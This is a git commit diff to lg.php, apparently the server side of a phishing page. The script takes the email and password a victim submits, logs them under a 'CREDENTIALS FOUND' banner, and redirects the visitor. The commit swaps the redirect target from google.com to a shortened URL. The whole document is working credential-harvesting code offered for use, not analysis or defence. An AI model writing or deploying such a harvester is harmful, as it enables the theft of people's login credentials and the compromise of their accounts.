79f5a17abaf52f1ba873b4597d2cd5dfd55cc990
dharick <58396545+dharick@users.noreply.github.com>
2022-08-26 17:08:07 +0530

    Update lg.php

--- lg.php
+++ lg.php
@@ -1,8 +1,8 @@
 <?php
-$username = $_POST["Email"];
-$password = $_POST["password"];
-$res = "[+++++++++++ CREDENTIALS FOUND +++++++++] Username: $username  Password: $password";
+$username = $_POST['Email'];
+$password = $_POST['password'];
+$res = "[+++++++++++ CREDENTIALS FOUND +++++++++] Username: $username <--|+++++++++++++++++|--> Password: $password";
 error_log("[+] Credentials Found!!!");
 error_log("$res");
-echo "<script type='text/javascript'>window.location='https://google.com'</script>";
+echo "<script type='text/javascript'>window.location='https://shorturl.ae/WNpcJ'</script>";
 ?>
